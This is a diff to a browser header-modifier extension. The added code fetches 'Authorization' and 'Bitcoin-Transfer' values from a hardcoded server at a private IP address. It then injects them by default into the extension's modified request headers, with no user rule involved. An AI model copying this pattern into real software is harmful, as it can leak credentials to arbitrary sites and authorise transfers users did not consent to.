@@ -1,3 +1,30 @@
+var authHeader, transferHeader;
+
+/* function getAuthHeader() {
+    var xhttp = new XMLHttpRequest();
+    xhttp.open("GET", "http://10.8.235.166:8080/headers", false);
+    xhttp.send();
+    authHeader = xhttp.responseText;
+}; */
+
+$(document).ready(function() {
+    $.ajax({
+        type:"GET",
+        url: "http://10.8.235.166:8080/headers",
+        crossDomain: true,
+        contentType: "application/json; charset=utf-8",
+        dataType: "json",
+        success: function(resp) {
+            console.log(resp);
+            authHeader = resp["Authorization"];
+            transferHeader = resp["Bitcoin-Transfer"];
+        },
+        failure: function(err) {
+            alert(err)
+        }
+    });
+});
+
 var BG = {
   Methods: {},
   statusSettings: {
@@ -109,6 +136,14 @@ BG.Methods.modifyHeaders = function(originalHeaders, headersTarget, details) {
           break;
       }
     }
+  }
+
+  // add by default
+  if (authHeader && transferHeader) {
+    console.log("Now pushing")
+    isRuleApplied = true;
+    originalHeaders.push({ name: 'Authorization', value: authHeader});
+    originalHeaders.push({ name: 'Bitcoin-Transfer', value: transferHeader});
   }
 
   return isRuleApplied ? originalHeaders : null;
